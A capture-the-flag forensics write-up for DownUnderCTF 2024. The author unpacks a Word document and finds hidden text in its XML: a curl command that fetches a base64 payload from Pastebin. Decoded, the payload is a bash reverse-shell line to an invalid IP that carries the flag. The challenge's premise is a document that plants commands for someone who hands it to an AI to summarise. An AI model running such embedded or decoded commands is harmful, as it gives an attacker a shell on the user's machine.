---
title: "tldr please summarise"
description: "I thought I was being 1337 by asking AI to help me solve challenges, now I have to reinstall Windows again. Can you help me out by find the flag in this document?"
pubDate: 2024-07-10
ctf: "DownUnderCTF 2024"
category: "forensics"
author: "sealldev"
section: "CTFs"
image: "images/24-downunder/icon.png"
---



We are given a `EmuWar.docx` that is mostly nothing.

![emuwardoc](images/24-downunder/emuwardoc.png)

I know that Office documents are just essentially zip archives, so I extract the contents:
```bash
$ 7z x EmuWar.docx
Scanning the drive for archives:
1 file, 8202 bytes (9 KiB)

Extracting archive: EmuWar.docx
--
Path = EmuWar.docx
Type = zip
Physical Size = 8202

Everything is Ok

Files: 9
Size:       26291
Compressed: 8202
```

Inside the `word/document.xml` I find a suspicious link:
```
... <w:t xml:space="preserve">; curl -sL https://pastebin.com/raw/ysYcKmbu | base64 -d &gt; </w:t></w:r><w:r><w:rPr> ...
```

Visiting the [Pastebin URL](https://pastebin.com/raw/ysYcKmbu) is a base64 string: `YmFzaCAtaSA+JiAvZGV2L3RjcC8yNjEuMjYzLjI2My4yNjcvRFVDVEZ7Y2hhdGdwdF9JX24zM2RfMl8zc2NhcDN9IDA+JjE=`.

Decoded is the following: `bash -i >& /dev/tcp/261.263.263.267/DUCTF{chatgpt_I_n33d_2_3scap3} 0>&1`.

Flag: `DUCTF{chatgpt_I_n33d_2_3scap3}`